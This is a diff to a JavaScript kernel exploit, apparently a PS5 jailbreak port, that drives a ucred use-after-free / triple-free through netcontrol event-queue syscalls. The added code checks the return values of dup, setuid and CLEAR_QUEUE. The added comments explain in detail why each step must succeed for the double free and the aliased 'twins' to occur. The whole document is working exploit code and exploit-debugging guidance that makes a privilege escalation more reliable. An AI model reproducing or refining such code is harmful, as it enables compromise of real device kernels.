@@ -410,6 +410,10 @@ const SYM = {
 //   see E:\ps5\dwarf\NETCTRL_RE\syscalls.py
 const SYSCALL_NUMS = {
     mprotect: 74n, sendmsg: 28n, read: 3n, write: 4n, close: 6n, getpid: 20n, setuid: 23n, recvmsg: 27n,
+    // getuid (24, confirmed in syscallnames[] on kernel_1000 and kernel_1200):
+    // reported alongside setuid so a privilege failure names itself instead of
+    // surfacing 512 rounds later as an unexplained self=all.
+    getuid: 24n,
     open: 5n, sys_dynlib_dlsym: 591n,
     dup: 41n, ioctl: 54n, munmap: 73n, socket: 97n, netcontrol: 99n,
     setsockopt: 105n, getsockopt: 118n, readv: 120n, writev: 121n,
@@ -601,6 +605,7 @@ const sys = {
     close(fd)  { return invoke("close", S(fd)); },
     dup(fd)    { return invoke("dup", S(fd)); },
     setuid(u)  { return invoke("setuid", S(u)); },
+    getuid()   { return invoke("getuid"); },
     getpid()   { return invoke("getpid"); },
     kqueue()   { return invoke("kqueue"); },
     sched_yield() { return invoke("sched_yield"); },
@@ -1609,7 +1614,18 @@ function doubleFreeAndFindTwins() {
     // Immediate find_twins, no settle between - matches upstream BD-JB5
     // Poops.java (close(dup(uafSock)) then findTwins() with no delay). The real
     // lever is TWIN_ATTEMPTS=5000 (restored above), not a settle.
-    sys.close(sys.dup(ST.uaf_sock));               // the double free
+    /* dup's result was discarded as well. If it returns -1 (uaf_sock already
+     * torn down, or the fd table in an unexpected state) then close(-1) is a
+     * no-op, nothing is freed, and find_twins grinds against a chunk that was
+     * never released — self=all again, with nothing in the log to say why.
+     * Upstream checks it; the cost here is one comparison. */
+    const dupfd = sys.dup(ST.uaf_sock);
+    if (dupfd < 0) {
+        beacon("double free: dup(" + ST.uaf_sock + ") -> " + dupfd);
+        throw new Error("ERR_TRIPLE_FREE: dup(uaf_sock) returned " + dupfd
+                        + " — nothing was freed, so no twins can exist");
+    }
+    sys.close(dupfd);                              // the double free
     return find_twins();
 }
 
@@ -1699,9 +1715,32 @@ function ucred_triple_free() {
     log("SET_QUEUE slot=" + slot);
 
     sys.close(dummy_sock);
-    sys.setuid(1);                               // allocate a fresh ucred
+
+    /* setuid's RESULT is load-bearing and was being discarded.
+     *
+     * Both calls exist for their allocator side effects: sys_setuid crget()s a
+     * new ucred, swaps it in, and crfree()s the old one. That only happens on
+     * SUCCESS. On EPERM it allocates a cred, fails the privilege check, frees
+     * the cred it just made, and leaves the process cred untouched — so no
+     * fresh ucred is installed, uaf_sock's f_cred stays the shared process cred
+     * with a large refcnt, and the close(dup(...)) later decrements it from N to
+     * N-1 without ever freeing anything. There is then no double free, no
+     * aliased chunk, and find_twins reports exactly what we are seeing:
+     * self=all, forever, at any attempt count.
+     *
+     * The reference implementation throws on -1 for both of these; we did not
+     * check either, so a privilege failure here was indistinguishable from a
+     * lost race. Check them, and report the uid either way. */
+    const uid0 = sys.getuid();
+    const su1 = sys.setuid(1);                   // allocate a fresh ucred
     ST.uaf_sock = sys.socket(AF_UNIX, SOCK_STREAM, 0);
-    sys.setuid(1);                               // free the previous one
+    const su2 = sys.setuid(1);                   // free the previous one
+    beacon("setuid uid_before=" + uid0 + " setuid#1=" + su1 + " setuid#2=" + su2
+           + " uid_now=" + sys.getuid());
+    if (su1 !== 0 || su2 !== 0)
+        throw new Error("ERR_TRIPLE_FREE: setuid(1) failed (" + su1 + "/" + su2
+                        + ") from uid " + uid0 + " — no fresh ucred is allocated,"
+                        + " so there is nothing to double free");
 
     /* HARD PRECONDITION, and until now an unchecked one.
      *
@@ -1742,7 +1781,18 @@ function ucred_triple_free() {
     wr32at(clear_buf, 0, ST.uaf_sock);
     // -1, as upstream does in BOTH branches; the work function searches all
     // three slots by ID itself, so naming one is unnecessary and divergent.
-    sys.netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clear_buf, 8);
+    /* CLEAR_QUEUE's result was discarded too, and it is THE step that performs
+     * the double f_count drop. Its work function returns non-zero (5) when no
+     * slot matches the ID, and the handler then skips the first decrement
+     * entirely — one drop instead of two, no imbalance, no double free. That is
+     * the same silent dead end as a failed setuid, and it looks identical from
+     * find_twins. A non-zero return here is not survivable, so say so. */
+    const clr = sys.netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clear_buf, 8);
+    beacon("CLEAR_QUEUE -> " + clr + " (fd " + ST.uaf_sock + ")");
+    if (clr !== 0)
+        throw new Error("ERR_TRIPLE_FREE: CLEAR_QUEUE returned " + clr
+                        + " — the slot did not match, so only one f_count drop "
+                        + "happened and there is no double free");
     log("CLEAR_QUEUE done");
 
     /* Set cr_refcnt back to 1 — with plain sendmsg on THIS thread, as upstream
